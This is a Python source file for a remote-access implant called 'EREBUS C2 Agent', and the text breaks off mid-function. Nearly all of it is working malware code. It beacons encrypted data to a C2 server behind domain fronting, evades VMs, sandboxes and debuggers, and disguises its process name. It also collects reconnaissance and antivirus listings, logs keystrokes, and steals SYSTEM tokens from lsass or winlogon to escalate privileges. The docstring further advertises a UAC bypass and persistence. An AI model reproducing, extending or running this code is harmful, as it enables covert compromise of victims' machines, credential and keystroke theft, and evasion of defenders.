"""
EREBUS C2 Agent — Cross-Platform Beacon

Wire protocol (matches server.py CryptoManager exactly):
  Frame: [hmac_sha256:32][timestamp_be:8][nonce:16][tag:16][ciphertext:N]
  Registration  → MASTER_KEY  → POST /a/reg  (response: per-agent AES-256 key)
  Check-in      → agent_key   → POST /a/in
  Result        → agent_key   → POST /a/out
  Heartbeat     → agent_key   → POST /a/hb

Security / Stealth:
  - AES-256-EAX + HMAC-SHA256, replay window ±60 s on all frames
  - Per-agent key, XOR-obfuscated in memory, zeroed on exit
  - TLS cert fingerprint pinning (SHA-256)
  - Domain fronting: SNI + Host override for CDN concealment
  - System-proxy auto-detection disabled
  - Request padding: randomised payload size to defeat traffic analysis
  - Process camouflage: prctl rename on Linux
  - Anti-analysis: VM / sandbox / debugger detection → dormancy

Offensive capabilities (shell task internal commands, prefix '!'):
  !impersonate:<pid>   steal and impersonate a process token (Windows)
  !token:revert        revert to original thread token (Windows)
  !token:list          enumerate high-value process tokens (Windows)
  !uac:fodhelper <cmd> elevate via fodhelper bypass (Windows)
  !persist:install     install persistence for current session
  !persist:remove      remove all persistence
  !evasion:check       run anti-analysis checks and report findings
  !sysinfo             dump extended system reconnaissance

Hard limits:
  shell output  2 MB  |  download  100 MB  |  upload  50 MB  |  keylog  512 K
"""

from __future__ import annotations

import base64
import collections
import concurrent.futures
import ctypes
import ctypes.util
import hashlib
import hmac as _hmac
import http.client
import io
import json
import os
import platform
import random
import socket
import ssl
import struct
import subprocess
import sys
import tempfile
import threading
import time
import urllib.request
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple
from urllib.request import Request

from Crypto.Cipher import AES

# ---------------------------------------------------------------------------
# Optional imports
# ---------------------------------------------------------------------------

try:
    import psutil as _psutil
    _HAS_PSUTIL = True
except ImportError:
    _HAS_PSUTIL = False

try:
    from PIL import ImageGrab as _ImageGrab
    _HAS_PIL = True
except ImportError:
    _HAS_PIL = False

try:
    from pynput import keyboard as _pynput_kb
    _HAS_PYNPUT = True
except ImportError:
    _HAS_PYNPUT = False

_IS_WINDOWS = platform.system() == "Windows"
_IS_LINUX   = platform.system() == "Linux"
_IS_MACOS   = platform.system() == "Darwin"


# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

_REPLAY_WINDOW      = 60             # max frame timestamp drift (seconds)
_MAX_OUTPUT_BYTES   = 2  * 1024**2   # 2 MB  — shell output
_MAX_DOWNLOAD_BYTES = 100 * 1024**2  # 100 MB — file download
_MAX_UPLOAD_BYTES   = 50  * 1024**2  # 50 MB  — file upload
_MAX_KEYLOG_CHARS   = 524_288        # 512 K chars
_RESULT_QUEUE_DEPTH = 256
_DORMANT_WAKE_INTERVAL = 3_600       # check every hour while dormant


# ---------------------------------------------------------------------------
# Beacon configuration
# ---------------------------------------------------------------------------

@dataclass
class BeaconConfig:
    """
    All tunable parameters. master_key_hex (64-char hex) is required.
    All-zero or empty key is rejected at Agent startup.
    """
    c2_host:          str  = "127.0.0.1"
    c2_port:          int  = 8443
    master_key_hex:   str  = ""       # REQUIRED — embed teamserver key
    use_tls:          bool = True
    verify_cert:      bool = False    # False = accept self-signed
    cert_fingerprint: str  = ""       # SHA-256 hex; "" = pin disabled

    # Domain fronting — set c2_host to CDN IP, fronting_host to CDN hostname
    # The TLS SNI and HTTP Host header are set to fronting_host, making
    # traffic appear destined for a legitimate CDN tenant.
    fronting_host:    str  = ""       # "" = disabled

    sleep_min:        int  = 30
    sleep_max:        int  = 90
    hb_interval:      int  = 60
    task_timeout:     int  = 120
    reg_retry_delay:  int  = 30

    # Request padding — add _p: <random bytes> to every JSON payload
    # to prevent size-based traffic fingerprinting.
    padding_min:      int  = 32       # bytes of padding added per request
    padding_max:      int  = 512

    # Anti-analysis: if True, detect VM/sandbox/debugger at startup.
    # On detection the agent enters dormancy rather than beaconing.
    evasion_mode:     bool = True

    proxy: Optional[str] = None

    user_agents: List[str] = field(default_factory=lambda: [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    ])


# ---------------------------------------------------------------------------
# In-memory key obfuscation
# ---------------------------------------------------------------------------

class _SecureKey:
    """XOR-masks key bytes against a random nonce in memory."""

    __slots__ = ("_store", "_mask", "_len")

    def __init__(self, key: bytes) -> None:
        self._len   = len(key)
        self._mask  = os.urandom(self._len)
        self._store = bytes(a ^ b for a, b in zip(key, self._mask))

    def get(self) -> bytes:
        return bytes(a ^ b for a, b in zip(self._store, self._mask))

    def clear(self) -> None:
        self._mask  = bytes(self._len)
        self._store = bytes(self._len)

    def __del__(self) -> None:
        self.clear()


# ---------------------------------------------------------------------------
# Crypto
# ---------------------------------------------------------------------------

class CryptoLayer:
    """
    AES-256-EAX + HMAC-SHA256 framing, wire-compatible with server.py.
    Frame: [hmac_sha256:32][timestamp_be:8][nonce:16][tag:16][ciphertext:N]
    """

    def pack(self, plaintext: bytes, key: bytes) -> bytes:
        ts      = struct.pack(">Q", int(time.time()))
        cipher  = AES.new(key, AES.MODE_EAX)
        ct, tag = cipher.encrypt_and_digest(plaintext)
        body    = ts + cipher.nonce + tag + ct
        sig     = _hmac.new(key, body, hashlib.sha256).digest()
        return sig + body

    def unpack(self, frame: bytes, key: bytes) -> bytes:
        if len(frame) < 32 + 8 + 16 + 16:
            raise ValueError("frame too short")
        sig, body = frame[:32], frame[32:]
        if not _hmac.compare_digest(sig,
                                    _hmac.new(key, body, hashlib.sha256).digest()):
            raise ValueError("HMAC verification failed")
        ts    = struct.unpack(">Q", body[:8])[0]
        drift = abs(time.time() - ts)
        if drift > _REPLAY_WINDOW:
            raise ValueError(f"replay window exceeded ({drift:.0f}s)")
        nonce, tag, ct = body[8:24], body[24:40], body[40:]
        return AES.new(key, AES.MODE_EAX, nonce=nonce).decrypt_and_verify(ct, tag)


# ---------------------------------------------------------------------------
# Custom HTTPS connection (fronting + pinning in one class)
# ---------------------------------------------------------------------------

class _C2HTTPSConnection(http.client.HTTPSConnection):
    """
    One connection class handling all TLS scenarios:
    - Plain TLS (no fronting, no pinning)
    - Domain fronting (SNI set to fronting_host, TCP to c2_host)
    - Cert pinning (SHA-256 check post-handshake)
    - Both simultaneously
    """

    def __init__(self, host: str, *,
                 fronting_host: str = "",
                 pin: str = "",
                 **kwargs) -> None:
        super().__init__(host, **kwargs)
        self._fronting = fronting_host
        self._pin      = pin.upper().replace(":", "").replace(" ", "")

    def connect(self) -> None:
        sni = self._fronting or self.host
        addr = (self.host, self.port or 443)
        raw  = socket.create_connection(addr, self.timeout, self.source_address)
        self.sock = self._context.wrap_socket(raw, server_hostname=sni)
        if self._pin:
            cert_der = self.sock.getpeercert(binary_form=True)
            if cert_der is None:
                raise ssl.SSLError("server presented no certificate")
            actual = hashlib.sha256(cert_der).hexdigest().upper()
            if actual != self._pin:
                self.close()
                raise ssl.SSLCertVerificationError(
                    f"TLS pin mismatch — expected {self._pin}, got {actual}"
                )


# ---------------------------------------------------------------------------
# Transport
# ---------------------------------------------------------------------------

class Transport:
    """
    HTTPS transport with:
    - Domain fronting (Host header + SNI override)
    - Cert fingerprint pinning
    - Request payload padding (size variance)
    - System-proxy auto-detection disabled
    - Explicit proxy support
    - UA rotation + realistic browser headers
    - Exponential-backoff retry
    """

    def __init__(self, cfg: BeaconConfig) -> None:
        self._cfg    = cfg
        self._opener = self._build_opener()

    def _build_ssl_ctx(self) -> ssl.SSLContext:
        ctx = ssl.create_default_context()
        if not self._cfg.verify_cert:
            ctx.check_hostname = False
            ctx.verify_mode    = ssl.CERT_NONE
        return ctx

    def _build_opener(self) -> urllib.request.OpenerDirector:
        ctx = self._build_ssl_ctx()
        fp  = (self._cfg.cert_fingerprint
               .upper().replace(":", "").replace(" ", ""))
        fh  = self._cfg.fronting_host

        proxy_h = (
            urllib.request.ProxyHandler(
                {"http": self._cfg.proxy, "https": self._cfg.proxy}
            )
            if self._cfg.proxy
            else urllib.request.ProxyHandler({})
        )

        _fp, _fh, _ctx = fp, fh, ctx

        class _Handler(urllib.request.HTTPSHandler):
            def https_open(self_, req):          # noqa: N805
                return self_.do_open(
                    lambda host, **kw: _C2HTTPSConnection(
                        host, fronting_host=_fh, pin=_fp, context=_ctx, **kw
                    ),
                    req,
                )

        return urllib.request.build_opener(proxy_h, _Handler())

    def _url(self, path: str) -> str:
        scheme = "https" if self._cfg.use_tls else "http"
        return f"{scheme}://{self._cfg.c2_host}:{self._cfg.c2_port}{path}"

    def _pad(self, data: dict) -> dict:
        """Add a random-length field to vary ciphertext size."""
        n = random.randint(self._cfg.padding_min, self._cfg.padding_max)
        return {**data, "_": base64.b64encode(os.urandom(n)).decode()}

    def pack_json(self, data: dict, key: bytes, crypto: CryptoLayer) -> bytes:
        return crypto.pack(json.dumps(self._pad(data)).encode(), key)

    def post_raw(self, path: str, body: bytes,
                 retries: int = 3, backoff: float = 5.0) -> Optional[bytes]:
        url = self._url(path)
        ua  = random.choice(self._cfg.user_agents)
        for attempt in range(retries):
            try:
                req = Request(url, data=body, method="POST")
                req.add_header("Content-Type",    "application/octet-stream")
                req.add_header("User-Agent",       ua)
                req.add_header("Accept",           "text/html,application/xhtml+xml,*/*;q=0.8")
                req.add_header("Accept-Language",  "en-US,en;q=0.9")
                req.add_header("Accept-Encoding",  "gzip, deflate, br")
                req.add_header("Cache-Control",    "no-cache")
                req.add_header("Connection",       "keep-alive")
                if self._cfg.fronting_host:
                    req.add_header("Host", self._cfg.fronting_host)
                with self._opener.open(req, timeout=30) as resp:
                    raw = resp.read()
                    enc = resp.info().get("Content-Encoding", "")
                    if "gzip" in enc:
                        import gzip
                        return gzip.decompress(raw)
                    return raw
            except Exception:
                if attempt < retries - 1:
                    time.sleep(backoff * (attempt + 1)
                               + random.uniform(0, backoff * 0.2))
        return None


# ---------------------------------------------------------------------------
# Anti-analysis
# ---------------------------------------------------------------------------

@dataclass
class _AnalysisReport:
    indicators: List[str] = field(default_factory=list)

    def suspicious(self) -> bool:
        return len(self.indicators) >= 2

    def summary(self) -> str:
        return "; ".join(self.indicators) if self.indicators else "clean"


class _AntiAnalysis:
    """
    Detects analysis environments.  Each check appends to indicators.
    Threshold: 2+ indicators → suspicious (minimises false positives in
    legitimate environments while still catching most sandboxes).
    """

    _SANDBOX_USERS = {
        "sandbox", "virus", "malware", "maltest", "sample", "test",
        "vmware", "vbox", "vboxuser", "admin", "user", "username",
        "currentuser", "analyst", "analysis",
    }
    _SANDBOX_HOSTS = {
        "sandbox", "malware", "cuckoo", "anubis", "anyrun", "joesandbox",
        "threatanalyzer", "virscan", "cape", "hybrid-analysis",
    }
    _ANALYSIS_PROCS_WIN = {
        "wireshark.exe", "procmon.exe", "procmon64.exe", "procexp.exe",
        "procexp64.exe", "x64dbg.exe", "x32dbg.exe", "ollydbg.exe",
        "idaq.exe", "idaq64.exe", "ida.exe", "ida64.exe",
        "fiddler.exe", "charles.exe", "httpdebuggerui.exe",
        "pestudio.exe", "exeinfope.exe", "pe-bear.exe", "detect-it-easy.exe",
        "volatility.exe", "autoruns.exe", "autoruns64.exe",
    }
    _ANALYSIS_PROCS_LIN = {
        "strace", "ltrace", "gdb", "lldb", "radare2", "r2",
        "tcpdump", "wireshark", "tshark", "strace",
    }

    @classmethod
    def check(cls) -> _AnalysisReport:
        r = _AnalysisReport()
        try:
            cls._check_user(r)
            cls._check_host(r)
            if _IS_WINDOWS:
                cls._check_windows(r)
            elif _IS_LINUX:
                cls._check_linux(r)
            elif _IS_MACOS:
                cls._check_macos(r)
            cls._check_procs(r)
            cls._check_timing(r)
        except Exception:
            pass
        return r

    @classmethod
    def _check_user(cls, r: _AnalysisReport) -> None:
        user = (os.environ.get("USERNAME") or os.environ.get("USER") or "").lower()
        if user in cls._SANDBOX_USERS:
            r.indicators.append(f"sandbox username: {user!r}")

    @classmethod
    def _check_host(cls, r: _AnalysisReport) -> None:
        host = socket.gethostname().lower()
        if any(s in host for s in cls._SANDBOX_HOSTS):
            r.indicators.append(f"sandbox hostname: {host!r}")

    @classmethod
    def _check_windows(cls, r: _AnalysisReport) -> None:
        k32 = ctypes.windll.kernel32
        u32 = ctypes.windll.user32

        # Debugger presence
        if k32.IsDebuggerPresent():
            r.indicators.append("IsDebuggerPresent=True")
        remote = ctypes.c_int(0)
        k32.CheckRemoteDebuggerPresent(
            k32.GetCurrentProcess(), ctypes.byref(remote)
        )
        if remote.value:
            r.indicators.append("remote debugger detected")

        # Screen resolution — 1024×768 or 800×600 are common sandbox defaults
        w = u32.GetSystemMetrics(0)
        h = u32.GetSystemMetrics(1)
        if (w, h) in ((1024, 768), (800, 600), (1280, 800)):
            r.indicators.append(f"suspicious resolution {w}×{h}")

        # Process count
        try:
            import winreg
            # VMware registry key
            try:
                winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                               r"SOFTWARE\VMware, Inc.\VMware Tools")
                r.indicators.append("VMware Tools registry key present")
            except OSError:
                pass
            # VirtualBox
            try:
                winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                               r"SOFTWARE\Oracle\VirtualBox Guest Additions")
                r.indicators.append("VirtualBox Guest Additions registry key present")
            except OSError:
                pass
        except Exception:
            pass

        # Process count via tasklist is slow; skip and rely on psutil path
        if _HAS_PSUTIL:
            n = len(list(_psutil.process_iter([])))
            if n < 25:
                r.indicators.append(f"low process count ({n})")

        # CPU count = 1 (many sandboxes)
        if os.cpu_count() == 1:
            r.indicators.append("single logical CPU")

    @classmethod
    def _check_linux(cls, r: _AnalysisReport) -> None:
        # TracerPid != 0 means we're being ptraced
        try:
            with open("/proc/self/status") as fh:
                for line in fh:
                    if line.startswith("TracerPid:"):
                        val = int(line.split(":")[1].strip())
                        if val != 0:
                            r.indicators.append(f"TracerPid={val} (debugger)")
        except OSError:
            pass

        # Hypervisor flag in cpuinfo
        try:
            with open("/proc/cpuinfo") as fh:
                content = fh.read().lower()
            if "hypervisor" in content:
                r.indicators.append("hypervisor flag in /proc/cpuinfo")
        except OSError:
            pass

        # DMI product name
        for path in (
            "/sys/class/dmi/id/product_name",
            "/sys/class/dmi/id/sys_vendor",
        ):
            try:
                with open(path) as fh:
                    val = fh.read().strip().lower()
                for kw in ("vmware", "virtualbox", "qemu", "kvm", "xen", "vbox"):
                    if kw in val:
                        r.indicators.append(f"DMI {os.path.basename(path)}: {val!r}")
                        break
            except OSError:
                pass

    @classmethod
    def _check_macos(cls, r: _AnalysisReport) -> None:
        try:
            out = subprocess.check_output(
                ["sysctl", "hw.model"], stderr=subprocess.DEVNULL, timeout=3,
            ).decode(errors="ignore").lower()
            for kw in ("vmware", "virtualbox", "qemu"):
                if kw in out:
                    r.indicators.append(f"hw.model contains {kw!r}")
        except Exception:
            pass

    @classmethod
    def _check_procs(cls, r: _AnalysisReport) -> None:
        target = (cls._ANALYSIS_PROCS_WIN if _IS_WINDOWS
                  else cls._ANALYSIS_PROCS_LIN)
        if not _HAS_PSUTIL:
            return
        found = []
        for p in _psutil.process_iter(["name"]):
            try:
                name = (p.info.get("name") or "").lower()
                if name in target:
                    found.append(name)
            except (_psutil.NoSuchProcess, _psutil.AccessDenied):
                pass
        if found:
            r.indicators.append(f"analysis process(es): {', '.join(found[:3])}")

    @classmethod
    def _check_timing(cls, r: _AnalysisReport) -> None:
        """
        Quick timing check: hypervisors and sandboxes often introduce overhead
        in tight loops, making them measurably slower than bare metal.
        """
        start = time.perf_counter()
        for _ in range(1_000_000):
            pass
        elapsed = time.perf_counter() - start
        if elapsed > 0.5:
            r.indicators.append(f"timing anomaly: 1M iterations took {elapsed:.2f}s")


# ---------------------------------------------------------------------------
# Process camouflage
# ---------------------------------------------------------------------------

class _ProcessCamouflage:
    """
    Rename the visible process name to something innocuous.
    On Linux: prctl(PR_SET_NAME).
    On Windows: SetConsoleTitleW (cosmetic, only affects console title).
    """

    _LINUX_NAMES = [
        "[kworker/u4:0]", "[kworker/0:1H]", "[ksoftirqd/0]",
        "[kcompactd0]", "[kthreadd]", "systemd-udevd",
    ]
    _WIN_TITLES = [
        "Windows Update", "Service Host: Remote Procedure Call",
        "Microsoft Security Health Service",
    ]

    @classmethod
    def apply(cls) -> None:
        try:
            if _IS_LINUX:
                name = random.choice(cls._LINUX_NAMES).encode("utf-8")
                PR_SET_NAME = 15
                libc = ctypes.CDLL(ctypes.util.find_library("c") or "libc.so.6")
                libc.prctl(PR_SET_NAME, ctypes.c_char_p(name), 0, 0, 0)
                # Also rename argv[0] in /proc/self/cmdline is not easily done,
                # but the prctl rename shows in 'ps aux' NAME column.
            elif _IS_WINDOWS:
                title = random.choice(cls._WIN_TITLES)
                ctypes.windll.kernel32.SetConsoleTitleW(title)
        except Exception:
            pass


# ---------------------------------------------------------------------------
# System information (extended recon)
# ---------------------------------------------------------------------------

class SysInfo:
    """Collects stable system metadata + extended recon for the registration beacon."""

    _cache: Optional[Dict] = None

    @classmethod
    def collect(cls) -> Dict:
        if cls._cache:
            return cls._cache
        info: Dict = {
            "agent_id":   cls._machine_id(),
            "hostname":   cls._hostname(),
            "username":   cls._username(),
            "os":         cls._os_str(),
            "arch":       platform.machine() or "unknown",
            "privileges": cls._privileges(),
        }
        # Extended recon — silently skipped on failure
        info["domain"]     = cls._domain()
        info["interfaces"] = cls._interfaces()
        info["av"]         = cls._av_products()
        info["pid"]        = os.getpid()
        info["ppid"]       = cls._ppid()
        cls._cache = info
        return info

    @staticmethod
    def _hostname() -> str:
        try:    return socket.gethostname()
        except Exception: return "unknown"

    @staticmethod
    def _username() -> str:
        for e in ("USERNAME", "USER", "LOGNAME"):
            v = os.environ.get(e)
            if v: return v
        return "unknown"

    @staticmethod
    def _os_str() -> str:
        try:    return f"{platform.system()} {platform.version()}"
        except Exception: return platform.system() or "unknown"

    @staticmethod
    def _privileges() -> str:
        if _IS_WINDOWS:
            try:
                return "Admin" if ctypes.windll.shell32.IsUserAnAdmin() else "User"
            except Exception:
                return "User"
        else:
            try:    return "root" if os.geteuid() == 0 else "user"
            except AttributeError: return "user"

    @staticmethod
    def _machine_id() -> str:
        raw = ""
        try:
            if _IS_WINDOWS:
                out = subprocess.check_output(
                    ["reg", "query",
                     r"HKLM\SOFTWARE\Microsoft\Cryptography", "/v", "MachineGuid"],
                    stderr=subprocess.DEVNULL, timeout=5,
                ).decode(errors="ignore")
                for line in out.splitlines():
                    if "MachineGuid" in line:
                        raw = line.split()[-1]; break
            elif _IS_LINUX:
                for p in ("/etc/machine-id", "/var/lib/dbus/machine-id"):
                    if os.path.exists(p):
                        with open(p) as fh: raw = fh.read().strip(); break
            elif _IS_MACOS:
                out = subprocess.check_output(
                    ["ioreg", "-rd1", "-c", "IOPlatformExpertDevice"],
                    stderr=subprocess.DEVNULL, timeout=5,
                ).decode(errors="ignore")
                for line in out.splitlines():
                    if "IOPlatformUUID" in line:
                        raw = line.split('"')[-2]; break
        except Exception:
            pass
        if not raw:
            raw = socket.gethostname() + (
                os.environ.get("USERNAME") or os.environ.get("USER") or ""
            )
        return hashlib.sha256(raw.encode()).hexdigest()[:16]

    @staticmethod
    def _domain() -> str:
        try:
            if _IS_WINDOWS:
                out = subprocess.check_output(
                    ["reg", "query",
                     r"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters",
                     "/v", "Domain"],
                    stderr=subprocess.DEVNULL, timeout=5,
                ).decode(errors="ignore")
                for line in out.splitlines():
                    if "Domain" in line and "REG_SZ" in line:
                        parts = line.strip().split()
                        if len(parts) >= 3:
                            return parts[-1]
            else:
                out = subprocess.check_output(
                    ["hostname", "--fqdn"],
                    stderr=subprocess.DEVNULL, timeout=3,
                ).decode(errors="ignore").strip()
                if "." in out:
                    return out.split(".", 1)[1]
        except Exception:
            pass
        return ""

    @staticmethod
    def _interfaces() -> List[Dict]:
        ifaces: List[Dict] = []
        try:
            if _HAS_PSUTIL:
                for name, addrs in _psutil.net_if_addrs().items():
                    for addr in addrs:
                        if addr.family == socket.AF_INET:
                            ifaces.append({"iface": name, "ip": addr.address,
                                           "netmask": addr.netmask or ""})
            else:
                # Fallback: platform commands
                if _IS_WINDOWS:
                    raw = subprocess.check_output(
                        ["ipconfig"], stderr=subprocess.DEVNULL, timeout=5,
                    ).decode(errors="ignore")
                    for line in raw.splitlines():
                        if "IPv4" in line and ":" in line:
                            ip = line.split(":")[-1].strip()
                            ifaces.append({"ip": ip})
                else:
                    raw = subprocess.check_output(
                        ["ip", "addr", "show"],
                        stderr=subprocess.DEVNULL, timeout=5,
                    ).decode(errors="ignore")
                    iface = ""
                    for line in raw.splitlines():
                        line = line.strip()
                        if line and line[0].isdigit():
                            iface = line.split(":")[1].strip() if ":" in line else ""
                        elif line.startswith("inet "):
                            ip = line.split()[1].split("/")[0]
                            ifaces.append({"iface": iface, "ip": ip})
        except Exception:
            pass
        return ifaces

    @staticmethod
    def _av_products() -> List[str]:
        avs: List[str] = []
        try:
            if _IS_WINDOWS:
                ps_cmd = (
                    "try { (Get-WmiObject -Namespace 'root\\SecurityCenter2' "
                    "-Class AntiVirusProduct -EA Stop).displayName -join ',' } "
                    "catch { '' }"
                )
                out = subprocess.check_output(
                    ["powershell", "-NoProfile", "-NonInteractive",
                     "-Command", ps_cmd],
                    stderr=subprocess.DEVNULL, timeout=8,
                ).decode(errors="ignore").strip()
                if out:
                    avs = [a.strip() for a in out.split(",") if a.strip()]
            elif _IS_LINUX and _HAS_PSUTIL:
                AV_PROCS = {"clamav", "clamd", "freshclam", "sophos",
                            "eset", "avg", "avast", "symantec", "crowdstrike",
                            "falcon-sensor", "sysdig", "falco"}
                for p in _psutil.process_iter(["name"]):
                    try:
                        n = (p.info.get("name") or "").lower()
                        if any(a in n for a in AV_PROCS):
                            avs.append(n)
                    except (_psutil.NoSuchProcess, _psutil.AccessDenied):
                        pass
        except Exception:
            pass
        return list(set(avs))

    @staticmethod
    def _ppid() -> int:
        try:
            if _HAS_PSUTIL:
                return _psutil.Process().ppid()
            return os.getppid()
        except Exception:
            return -1


# ---------------------------------------------------------------------------
# Keylog buffer
# ---------------------------------------------------------------------------

class KeylogBuffer:

    def __init__(self, max_chars: int = _MAX_KEYLOG_CHARS) -> None:
        self._max       = max_chars
        self._buf: List[str] = []
        self._count     = 0
        self._lock      = threading.Lock()
        self._listener  = None

    def start(self) -> str:
        if not _HAS_PYNPUT:
            return "pynput unavailable"
        if self._listener is not None:
            return "keylogger already running"
        try:
            self._listener = _pynput_kb.Listener(on_press=self._on_press)
            self._listener.start()
            return "keylogger started"
        except Exception as exc:
            self._listener = None
            return f"keylogger start failed: {exc}"

    def stop(self) -> str:
        if self._listener is None:
            return "keylogger not running"
        try:    self._listener.stop()
        except Exception: pass
        self._listener = None
        with self._lock:
            captured = "".join(self._buf)
            self._buf.clear()
            self._count = 0
        return captured or "(no keys captured)"

    def _on_press(self, key) -> None:
        with self._lock:
            if self._count >= self._max:
                return
            try:    ch = key.char or ""
            except AttributeError: ch = f"[{key.name}]"
            self._buf.append(ch)
            self._count += len(ch)


# ---------------------------------------------------------------------------
# Task result
# ---------------------------------------------------------------------------

@dataclass
class TaskResult:
    task_id: str
    output:  str
    success: bool


# ---------------------------------------------------------------------------
# Result queue
# ---------------------------------------------------------------------------

class ResultQueue:
    """Bounded FIFO drained by a background sender thread with backoff retry."""

    def __init__(self, max_size: int = _RESULT_QUEUE_DEPTH) -> None:
        self._items: collections.deque = collections.deque(maxlen=max_size)
        self._lock  = threading.Lock()
        self._ready = threading.Event()

    def enqueue(self, result: TaskResult) -> None:
        with self._lock:
            self._items.append(result)
        self._ready.set()

    def drain(self, n: int = 16) -> List[TaskResult]:
        with self._lock:
            batch = [self._items.popleft()
                     for _ in range(min(n, len(self._items)))]
            if not self._items:
                self._ready.clear()
        return batch

    def requeue(self, results: List[TaskResult]) -> None:
        with self._lock:
            self._items.extendleft(reversed(results))
        if results:
            self._ready.set()

    def wait(self, timeout: float) -> bool:
        return self._ready.wait(timeout)

    def __len__(self) -> int:
        with self._lock:
            return len(self._items)


# ---------------------------------------------------------------------------
# Task schema validation
# ---------------------------------------------------------------------------

_TASK_REQUIRED: Dict[str, List[str]] = {
    "shell":        ["task_id", "command"],
    "download":     ["task_id", "command"],
    "upload":       ["task_id", "command"],
    "proc_list":    ["task_id"],
    "file_list":    ["task_id", "command"],
    "port_scan":    ["task_id", "command"],
    "screenshot":   ["task_id"],
    "keylog_start": ["task_id"],
    "keylog_stop":  ["task_id"],
    "sleep":        ["task_id", "command"],
    "selfdestruct": ["task_id", "command"],
}


def _validate_task(task: object) -> Optional[str]:
    if not isinstance(task, dict):
        return f"task must be a dict, got {type(task).__name__}"
    t = task.get("type")
    if not isinstance(t, str):
        return "task.type missing or not a string"
    required = _TASK_REQUIRED.get(t)
    if required is None:
        return f"unknown task type: {t!r}"
    for f in required:
        if f not in task:
            return f"task.{f} required for type {t!r}"
        if not isinstance(task[f], str):
            return f"task.{f} must be a string"
    if "args" in task and not isinstance(task["args"], dict):
        return "task.args must be a dict"
    return None


# ---------------------------------------------------------------------------
# Windows privilege / token operations
# ---------------------------------------------------------------------------

class _WinToken:
    """
    Windows token manipulation.
    All methods are no-ops and return failure on non-Windows platforms.
    """

    PROCESS_QUERY_INFORMATION = 0x0400
    TOKEN_DUPLICATE           = 0x0002
    TOKEN_IMPERSONATE         = 0x0004
    TOKEN_QUERY               = 0x0008
    TOKEN_ALL_ACCESS           = 0xF01FF
    SE_DEBUG_NAME             = "SeDebugPrivilege"
    SE_IMPERSONATE_NAME       = "SeImpersonatePrivilege"
    SecurityImpersonation     = 2
    TokenPrimary              = 1
    TokenImpersonation        = 2

    @classmethod
    def _k32(cls):  return ctypes.windll.kernel32
    @classmethod
    def _adv(cls):  return ctypes.windll.advapi32

    @classmethod
    def enable_privilege(cls, priv_name: str) -> bool:
        if not _IS_WINDOWS:
            return False
        try:
            import win32security, win32api
            hToken = win32security.OpenProcessToken(
                win32api.GetCurrentProcess(),
                win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY
            )
            luid = win32security.LookupPrivilegeValue(None, priv_name)
            win32security.AdjustTokenPrivileges(
                hToken, False,
                [(luid, win32security.SE_PRIVILEGE_ENABLED)]
            )
            return True
        except Exception:
            pass
        # ctypes fallback
        try:
            class LUID(ctypes.Structure):
                _fields_ = [("LowPart", ctypes.c_ulong), ("HighPart", ctypes.c_long)]
            class LUID_AND_ATTRIBUTES(ctypes.Structure):
                _fields_ = [("Luid", LUID), ("Attributes", ctypes.c_ulong)]
            class TOKEN_PRIVILEGES(ctypes.Structure):
                _fields_ = [("PrivilegeCount", ctypes.c_ulong),
                             ("Privileges", LUID_AND_ATTRIBUTES * 1)]
            SE_PRIVILEGE_ENABLED = 0x00000002
            h_token = ctypes.c_void_p()
            cls._k32().OpenProcessToken(
                cls._k32().GetCurrentProcess(),
                0x0028, ctypes.byref(h_token)
            )
            luid = LUID()
            cls._adv().LookupPrivilegeValueW(
                None, priv_name, ctypes.byref(luid)
            )
            tp = TOKEN_PRIVILEGES()
            tp.PrivilegeCount = 1
            tp.Privileges[0].Luid = luid
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
            cls._adv().AdjustTokenPrivileges(
                h_token, False, ctypes.byref(tp), 0, None, None
            )
            cls._k32().CloseHandle(h_token)
            return True
        except Exception:
            return False

    @classmethod
    def get_system_token(cls) -> Optional[int]:
        """Duplicate the token of a SYSTEM process (winlogon or lsass)."""
        if not _IS_WINDOWS:
            return None
        cls.enable_privilege(cls.SE_DEBUG_NAME)
        SYSTEM_PROCS = {"lsass.exe", "winlogon.exe", "services.exe"}
        try:
            SNAPPROCESS = 0x00000002
            class PROCESSENTRY32(ctypes.Structure):
                _fields_ = [
                    ("dwSize",              ctypes.c_ulong),
                    ("cntUsage",            ctypes.c_ulong),
                    ("th32ProcessID",       ctypes.c_ulong),
                    ("th32DefaultHeapID",   ctypes.c_void_p),
                    ("th32ModuleID",        ctypes.c_ulong),
                    ("cntThreads",          ctypes.c_ulong),
                    ("th32ParentProcessID", ctypes.c_ulong),
                    ("pcPriClassBase",      ctypes.c_long),
                    ("dwFlags",             ctypes.c_ulong),
                    ("szExeFile",           ctypes.c_char * 260),
                ]
            snap = cls._k32().CreateToolhelp32Snapshot(SNAPPROCESS, 0)
            pe   = PROCESSENTRY32()
            pe.dwSize = ctypes.sizeof(PROCESSENTRY32)
            if not cls._k32().Process32First(snap, ctypes.byref(pe)):
                cls._k32().CloseHandle(snap)
                return None
            while True:
                name = pe.szExeFile.decode(errors="ignore").lower()
                if name in SYSTEM_PROCS:
                    pid = pe.th32ProcessID
                    h_proc = cls._k32().OpenProcess(
                        cls.PROCESS_QUERY_INFORMATION, False, pid
                    )
                    if h_proc:
                        h_tok = ctypes.c_void_p()
                        if cls._adv().OpenProcessToken(
                            h_proc,
                            cls.TOKEN_DUPLICATE | cls.TOKEN_QUERY,
                            ctypes.byref(h_tok)
                        ):
                            h_dup = ctypes.c_void_p()
                            if cls._adv().DuplicateTokenEx(
                                h_tok,
                                cls.TOKEN_ALL_ACCESS,
                                None,
                                cls.SecurityImpersonation,
                                cls.TokenImpersonation,
                                ctypes.byref(h_dup)
                            ):
